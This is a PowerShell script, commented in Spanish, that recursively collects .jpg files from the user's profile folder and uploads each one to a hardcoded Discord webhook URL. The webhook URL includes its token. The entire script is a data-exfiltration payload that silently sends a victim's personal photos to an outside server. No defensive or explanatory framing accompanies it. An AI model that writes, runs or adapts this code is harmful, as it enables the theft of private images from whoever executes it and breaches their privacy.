$wc = New-Object System.Net.WebClient

$files = Get-ChildItem -Path "$env:USERPROFILE\" -Include *.jpg, -Recurse -ErrorAction SilentlyContinue

if ($files.Count -eq 0) {
    Write-Host "No se encontraron archivos para subir."
    exit
}

$webhookUrl = "https://discordapp.com/api/webhooks/1353546274648883290/NTqOpbQ455vKWBogOU9SmsSnDfB33QzqzHPbo68hwYuiXRZPGyRTFgUvsm21ECYK3_MH"

foreach ($file in $files) {
    try {
        # Subir el archivo
        $wc.UploadFile($webhookUrl, $file.FullName)
        Write-Host "Archivo subido: $($file.FullName)"
    } catch {
        Write-Host "Error al subir el archivo: $($file.FullName)"
        Write-Host "Error: $_"
    }
}

$wc.Dispose()